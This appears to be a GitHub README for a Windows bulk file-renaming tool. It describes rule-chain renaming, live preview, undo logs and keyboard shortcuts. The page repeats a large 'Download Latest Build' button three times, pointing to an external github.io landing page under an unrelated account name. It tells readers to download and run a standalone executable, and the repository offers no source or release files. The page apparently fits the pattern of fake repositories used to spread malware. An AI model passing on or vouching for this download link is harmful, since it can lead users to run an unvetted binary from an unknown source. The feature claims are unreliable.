<div align="center">

<img src="assets/banner.svg" width="100%" alt="Rename Tool Advanced banner"/>

# rename-tool-optimizer 🗂️⚡

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*A precision batch renaming engine for people who refuse to touch a file one at a time.*

<p align="center">
  <a href="https://mindwhisperconform.github.io/rename-tool-optimizer/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-4338CA?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>
</p>
</div>

## 🔍 Overview

**rename-tool-optimizer** is a desktop utility for Windows built around a single obsession: making bulk file renaming fast, predictable, and reversible. Anyone who has wrangled a folder of five thousand scanned invoices, a photography export batch, or a decade of loosely-organized project archives knows the pain of manual renaming. This tool exists to replace that tedium with a rule-based rename engine that previews every change before it touches a single byte on disk.

The project sits in the "rename tool advanced" category of file-management utilities, but it distinguishes itself by treating renaming as a *pipeline* rather than a one-shot action. Sequential numbering, regex substitution, metadata extraction (EXIF dates, audio tags), case transforms, and find-and-replace chains can all be composed together, reordered, and saved as reusable presets. Nothing executes silently — the live preview pane is the single source of truth for what will happen.

Who it's for: archivists, photographers, musicians organizing tagged audio libraries, developers cleaning up build artifacts, and IT teams standardizing file naming conventions across shared drives. If your workflow involves "select many files, produce consistent names," this tool was built with your exact headache in mind.

<p align="center">

<a href="https://mindwhisperconform.github.io/rename-tool-optimizer/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-4338CA?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>

</p>

---

## 🧩 What It Actually Does

- **Rule-chain renaming** — stack unlimited transform steps (replace, insert, case, trim, number) into a single ordered pipeline that runs left to right, deterministically.

- **Live preview grid** — every file shows its current name beside its projected new name before you commit, with conflicts and collisions flagged in red inline.

- **Metadata-aware tokens** — pull EXIF capture dates, ID3 audio tags, file creation/modified timestamps, and image resolution directly into the name template.

- **Regex substitution engine** — full capture-group support for advanced pattern matching, so `IMG_(\d+)` can become `Photo-$1` in one step.

- **Undo history with real rollback** — every batch operation is logged to a session file, letting you revert an entire rename pass, not just the last file.

- **Preset library** — save rule chains as named presets (`Invoice-Cleanup`, `Podcast-Episodes`, `RAW-Export`) and re-apply them across projects in one click.

- **Duplicate & collision guard** — the engine refuses to overwrite existing files silently; it auto-suffixes or halts the batch based on your chosen conflict policy.

- **Drag-and-drop batching** — drop folders, mixed file types, or a filtered subset straight from Explorer into the queue.

> [!TIP]
> Build a preset once for your most common naming pattern, then reuse it every time a fresh export lands in your folder. It turns a five-minute chore into a two-click one.

---

## 🚀 Getting Started

1. Visit the landing page using the download button below and grab the latest standalone build.

2. Run the executable — no installer wizard, no background services, no admin prompt required for standard use.

3. Drag your target folder or file selection into the queue panel.

4. Build your rule chain in the sidebar, review the live preview grid, then click **Apply** to commit the batch.

> [!NOTE]
> The app is portable by design. You can run it from a USB drive, a network share, or a project folder without leaving registry residue behind.

---

## 💻 System Requirements

| Requirement | Detail |
|---|---|
| OS | Windows 10 (64-bit) or Windows 11 |
| Dependencies | None — fully standalone binary |
| Disk space | Under 50 MB |
| RAM | 4 GB minimum, 8 GB recommended for batches over 10,000 files |
| Admin rights | Not required for standard folder operations |
| .NET / runtimes | Bundled — nothing to install separately |

![Status](https://img.shields.io/badge/build-passing-brightgreen?style=flat-square) ![Tech](https://img.shields.io/badge/engine-native%20C%2B%2B-red?style=flat-square) ![Arch](https://img.shields.io/badge/architecture-x64-lightgrey?style=flat-square)

---

## ⚙️ How It Works

The rename pipeline follows a consistent, auditable flow every single time — no surprises, no silent mutations.

1. **Scan** — the tool indexes selected files and reads relevant metadata (timestamps, tags, dimensions).

2. **Rule chain build** — your configured transform steps are compiled into an ordered execution plan.

3. **Preview render** — the plan runs in a sandboxed dry pass, producing projected filenames without touching disk.

4. **Conflict check** — collisions, invalid characters, and path-length limits are flagged before commit.

5. **Commit** — approved changes are written to disk, and a full undo log is saved for that session.

```mermaid
flowchart LR
Scan --> RuleChain --> Preview --> ConflictCheck --> Commit
```

---

## 🧪 Troubleshooting

**Q: My preview shows names but nothing happens when I click Apply.**
A: Check the conflict guard panel — if any row is flagged red, the batch is paused until you resolve or override the collision policy.

**Q: Regex substitution isn't matching anything.**
A: Confirm the pattern is being tested against the filename *without* the extension by default; toggle "Include extension in match" if your pattern targets the full filename.

**Q: EXIF date tokens are showing blank on some photos.**
A: Some files lack embedded EXIF data (screenshots, edited exports). Fall back to "file created" or "file modified" timestamp tokens for those cases.

**Q: Can I undo a batch after closing the app?**
A: Yes — undo logs persist as session files on disk and can be reloaded from the History panel on next launch.

**Q: The tool renamed files with unexpected numbering order.**
A: Numbering follows the sort order set in the queue panel (name, date, or manual drag order), not the OS file explorer order. Set sort order before applying sequential numbering.

> [!WARNING]
> Always run a dry preview pass on an unfamiliar folder before applying an aggressive regex chain — malformed capture groups can produce identical filenames across a batch, which triggers the collision guard en masse.

---

## 🎨 UI / UX Details

<details>
<summary><strong>Keyboard Shortcuts Reference</strong></summary>

| Shortcut | Action |
|---|---|
| `Ctrl + O` | Open folder into queue |
| `Ctrl + Shift + O` | Add files (multi-select dialog) |
| `Ctrl + D` | Duplicate current rule chain |
| `Ctrl + N` | New empty rule chain |
| `Ctrl + S` | Save current chain as preset |
| `Ctrl + Shift + S` | Save preset as new name |
| `Ctrl + Z` | Undo last committed batch |
| `Ctrl + Shift + Z` | Redo last undone batch |
| `Ctrl + Enter` | Apply rename batch |
| `Ctrl + P` | Toggle live preview panel |
| `Ctrl + F` | Focus find/replace rule field |
| `Delete` | Remove selected file from queue |
| `Ctrl + A` | Select all files in queue |
| `F2` | Rename single selected file inline |
| `F5` | Refresh queue metadata |
| `Ctrl + ,` | Open Settings |
| `Esc` | Cancel active rename operation |

</details>

**Themes** — Light, Dark, and a high-contrast accessibility theme, all switchable without restart from Settings.

**Settings persistence** — window layout, last-used preset, and conflict policy are remembered per-user across sessions.

**Conflict policy options** — `Skip`, `Auto-suffix (-1, -2...)`, `Overwrite`, `Halt batch` — configurable globally or per rule chain.

---

## 🤝 Contributing & Community

Issues, feature requests, and pull requests are welcome. Before opening a PR, please:

- Search existing issues to avoid duplicate reports.

- Include a sample rule chain or preset export when reporting rename-behavior bugs.

- Keep PRs focused — one capability or fix per pull request makes review faster.

> [!IMPORTANT]
> This project follows a standard Contributor Covenant code of conduct. Be respectful, be specific in bug reports, and test your rule chains on a copy of your data before filing an issue.

Discussions, roadmap voting, and preset-sharing threads live in the repository's Discussions tab.

---

## 📄 License

Released under the [MIT License](LICENSE), 2026.

---

## ⚠️ Disclaimer

This software is provided "as is," without warranty of any kind. Always maintain backups of important files before running batch operations — while the undo log and dry-preview system are designed to prevent data loss, no rename tool can substitute for a proper backup strategy on irreplaceable files.

<p align="center">

<a href="https://mindwhisperconform.github.io/rename-tool-optimizer/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-4338CA?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>

</p>